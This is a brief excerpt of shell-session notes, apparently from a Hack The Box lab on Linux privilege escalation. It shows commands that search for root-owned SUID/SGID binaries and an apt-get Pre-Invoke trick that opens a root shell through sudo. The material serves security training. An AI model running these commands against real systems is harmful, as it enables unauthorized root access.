...
```shell-session
kaliheker69@htb[/htb]$ find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null
...
```shell-session
kaliheker69@htb[/htb]$ find / -user root -perm -6000 -exec ls -ldb {} \; 2>/dev/null
...
```shell-session
kaliheker69@htb[/htb]$ sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh
